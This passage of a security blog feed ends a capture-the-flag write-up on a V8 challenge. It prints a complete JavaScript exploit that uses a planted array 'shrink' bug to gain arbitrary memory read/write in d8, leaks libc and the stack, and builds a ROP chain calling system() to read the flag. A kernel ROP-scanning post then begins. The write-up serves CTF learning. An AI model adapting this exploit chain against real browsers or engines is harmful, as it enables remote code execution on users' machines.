+<span class="kd">let</span> <span class="nx">idx_25</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="k">while </span><span class="p">((</span><span class="nx">idx_25</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x830</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="nx">idx_25</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="c1">// allocate until we see something that looks sorta like a heap pointer in idx 31</span>
+<span class="kd">let</span> <span class="nx">idx_31</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]);</span>
+<span class="k">while </span><span class="p">((</span><span class="nx">idx_31</span> <span class="o">&amp;</span> <span class="mh">0xf000</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x5000</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">idx_31</span> <span class="o">&amp;</span> <span class="mh">0xf000</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x6000</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="nx">idx_31</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="c1">// Leak the code pointer</span>
+<span class="kd">let</span> <span class="nx">pie_leak</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">PIE Leak: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">pie_leak</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Calculate base address of d8 binary</span>
+<span class="kd">let</span> <span class="nx">pie_base</span> <span class="o">=</span> <span class="nx">pie_leak</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x1174830</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">PIE Base: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">pie_base</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Leak the backing_store pointer of the arrs[0] DataView</span>
+<span class="kd">let</span> <span class="nx">backing_store</span> <span class="o">=</span> <span class="p">(</span><span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">backing_store: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">backing_store</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DataView</span><span class="p">(</span><span class="nx">arrs</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+<span class="c1">// Address in GOT we want to leak</span>
+<span class="nx">got_pkey_set</span> <span class="o">=</span> <span class="nx">pie_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x28ab9d8</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">got_pkey_set: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">got_pkey_set</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Overwrite backing_store pointer</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">got_pkey_set</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">got_pkey_set</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">libc_pkey_set</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nf">getBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">libc_pkey_set: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">libc_pkey_set</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// OUT:</span>
+<span class="c1">// PIE Leak: 0x5e0325bbe830</span>
+<span class="c1">// PIE Base: 0x5e0324a4a000</span>
+<span class="c1">// backing_store: 0x5e03323ad4d0</span>
+<span class="c1">// got_pkey_set: 5e03272f59d8</span>
+<span class="c1">// libc_pkey_set: 7b060ff26290</span>
+</code></pre></div></div>
+
+<p>Unfortunately, this code only works maybe once in four tries for reasons that are beyond my comprehension.</p>
+
+<p>Regardless, we now have arbitrary read/write by using either <code class="language-plaintext highlighter-rouge">dataview.getBigUint64</code> or <code class="language-plaintext highlighter-rouge">dataview.setBigUint64</code>!</p>
+
+<p>With this, I finished the exploit off by leaking <code class="language-plaintext highlighter-rouge">environ</code> from libc to get a stack pointer and overwriting the stack with a ROP chain:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span> <span class="k">return</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+
+<span class="kd">let</span> <span class="nx">arrs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">()</span>
+
+<span class="kd">let</span> <span class="nx">idx_25</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="k">while </span><span class="p">((</span><span class="nx">idx_25</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x830</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="nx">idx_25</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">idx_31</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]);</span>
+<span class="k">while </span><span class="p">((</span><span class="nx">idx_31</span> <span class="o">&amp;</span> <span class="mh">0xf000</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x5000</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">idx_31</span> <span class="o">&amp;</span> <span class="mh">0xf000</span><span class="nx">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x6000</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="nx">idx_31</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="c1">// Leak the code pointer we saw at idx 25</span>
+<span class="kd">let</span> <span class="nx">pie_leak</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">PIE Leak: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">pie_leak</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Calculate base address of d8 binary</span>
+<span class="kd">let</span> <span class="nx">pie_base</span> <span class="o">=</span> <span class="nx">pie_leak</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x1174830</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">PIE Base: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">pie_base</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Leak the backing_store pointer of the arrs[0] DataView</span>
+<span class="kd">let</span> <span class="nx">backing_store</span> <span class="o">=</span> <span class="p">(</span><span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">backing_store: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">backing_store</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DataView</span><span class="p">(</span><span class="nx">arrs</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+<span class="c1">// Address in GOT we want to leak</span>
+<span class="nx">got_pkey_set</span> <span class="o">=</span> <span class="nx">pie_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x28ab9d8</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">got_pkey_set: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">got_pkey_set</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// Overwrite backing_store pointer</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">got_pkey_set</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">got_pkey_set</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">libc_pkey_set</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nf">getBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">libc_pkey_set: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">libc_pkey_set</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">let</span> <span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">libc_pkey_set</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x12a530</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">libc Base: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">libc_base</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+
+<span class="kd">let</span> <span class="nx">environ</span>  <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x20ad58</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">environ: </span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">environ</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">environ</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">environ</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">sp_leak</span> <span class="o">=</span> <span class="nx">dataview</span><span class="p">.</span><span class="nf">getBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">sp_leak: 0x</span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">sp_leak</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">weh</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">sp_target</span> <span class="o">=</span> <span class="nx">sp_leak</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x138</span><span class="p">)</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">sp_target: 0x</span><span class="dl">"</span> <span class="o">+</span>  <span class="nx">sp_target</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// flag is at ./flag.txt, so write 'cat f*\0' somewhere for system()</span>
+<span class="kd">let</span> <span class="nx">cmd_str</span> <span class="o">=</span> <span class="nx">sp_leak</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">cmd_str</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">cmd_str</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">cmd_str = 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">cmd_str</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">dataview</span><span class="p">.</span><span class="nf">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x20746163</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x2a66</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="kd">let</span> <span class="nx">system</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x58750</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">pop_rdi</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x000000000010f78b</span><span class="p">);</span>
+
+<span class="c1">// ret</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">pop_rdi</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">ret = 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ret</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">dataview</span><span class="p">.</span><span class="nf">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">ret</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="c1">// pop rdi</span>
+<span class="nx">sp_target</span> <span class="o">+=</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">pop_rdi = 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">pop_rdi</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">dataview</span><span class="p">.</span><span class="nf">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">pop_rdi</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="c1">// cmd_str</span>
+<span class="nx">sp_target</span> <span class="o">+=</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">binsh</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x1cb42f</span><span class="p">);</span>
+<span class="nx">dataview</span><span class="p">.</span><span class="nf">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">cmd_str</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="c1">// system</span>
+<span class="nx">sp_target</span> <span class="o">+=</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">((</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">sp_target</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="nx">dataview</span><span class="p">.</span><span class="nf">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">system</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="c1">// Securinets{shrink_is_op}</span>
+</code></pre></div></div>
+
+<p>I encountered <em>a lot</em> of issues with differences in behavior when running the exploit directly against d8 on my host versus in the provided container and running d8 under GDB versus running it directly. Eventually, I got it working though!</p>
+
+<p>Thanks for reading! I learned a ton while working on this challenge but I am still an absolute noob at v8, hopefully my writeup is coherent :p</p>
+
+<p>I’m looking forwards to working on more v8 challenges in the future :)</p>]]></content><author><name>Jennifer Miller</name></author><category term="Exploitation" /><category term="Browser" /><summary type="html"><![CDATA[I played Securinets Quals this weekend with Shellphish, we ended up placing 7th and qualifying for finals! When I logged on to play all of the released pwn was already solved or close to solved by @vy except for the v8 challenge. Despite having never touched v8 pwn before, I decided to give it a go and I managed to solve it. This is my writeup for that challenge :)]]></summary></entry><entry><title type="html">The Joys of Linux Kernel ROP Gadget Scanning</title><link href="https://zolutal.github.io/joys-of-kernel-rop/" rel="alternate" type="text/html" title="The Joys of Linux Kernel ROP Gadget Scanning" /><published>2025-09-03T00:00:00+00:00</published><updated>2025-09-03T00:00:00+00:00</updated><id>https://zolutal.github.io/joys-of-kernel-rop</id><content type="html" xml:base="https://zolutal.github.io/joys-of-kernel-rop/"><![CDATA[<p>Linux Kernel ROP gadget scanning is one of those things that seems easy in theory – just run <code class="language-plaintext highlighter-rouge">ROPgadget --binary vmlinux</code> on it!
 In practice, however, anyone who has used that method has likely had to sift through a large amount of false positives and likely missed some gadgets due to false negatives.
 This is a result of a few quirks of Linux kernel images, some of which make solving the false positive/negative problems a bit difficult.</p>
 
